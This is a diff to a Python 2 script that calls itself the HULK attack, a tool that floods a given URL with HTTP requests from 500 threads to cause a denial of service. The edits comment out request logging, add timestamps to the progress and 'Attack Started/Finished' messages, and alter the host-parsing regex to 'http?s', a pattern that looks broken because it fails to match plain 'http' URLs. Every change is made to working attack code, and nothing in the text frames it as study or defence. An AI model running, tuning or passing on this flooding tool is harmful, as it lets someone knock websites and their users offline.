@@ -12,7 +12,7 @@ import sys
 import threading
 import random
 import re
-import json
+# import json
 import datetime
 
 #global params
@@ -76,9 +76,9 @@ def usage():
 	print 'you can add "safe" after url, to autoshut after dos'
 	print '---------------------------------------------------'
 
-def log(request):
-	global request_counter
-	print datetime.datetime.now(), 'REQUEST COUNT :', request_counter, '>>>', request.get_full_url()
+# def log(request):
+	# global request_counter
+	# print datetime.datetime.now(), 'REQUEST COUNT :', request_counter, '>>>', request.get_full_url()
 	# print request.get_method()
 	# print json.dumps(request.headers, indent=4, sort_keys=True)
 	# print dir(request)  # list lots of other stuff in Request
@@ -102,7 +102,7 @@ def httpcall(url):
 	request.add_header('Host',host)
 	try:
 			inc_counter()
-			log(request)
+			# log(request)
 			urllib2.urlopen(request)
 	except urllib2.HTTPError, e:
 			print e.code
@@ -136,10 +136,10 @@ class MonitorThread(threading.Thread):
 		previous=request_counter
 		while flag==0:
 			if (previous+100<request_counter) & (previous<>request_counter):
-				print "%d Requests Sent" % (request_counter)
+				print "%d Requests Sent @" % (request_counter), datetime.datetime.now()
 				previous=request_counter
 		if flag==2:
-			print "\n-- HULK Attack Finished --"
+			print "\n-- HULK Attack Finished --", datetime.datetime.now()
 
 #execute 
 if len(sys.argv) < 2:
@@ -150,14 +150,14 @@ else:
 		usage()
 		sys.exit()
 	else:
-		print "-- HULK Attack Started --"
+		print "-- HULK Attack Started --", datetime.datetime.now()
 		if len(sys.argv)== 3:
 			if sys.argv[2]=="safe":
 				set_safe()
 		url = sys.argv[1]
 		if url.count("/")==2:
 			url = url + "/"
-		m = re.search('https\://([^/]*)/?.*', url)
+		m = re.search('http?s\://([^/]*)/?.*', url)
 		host = m.group(1)
 		# print httpcall(url)
 		for i in range(500):
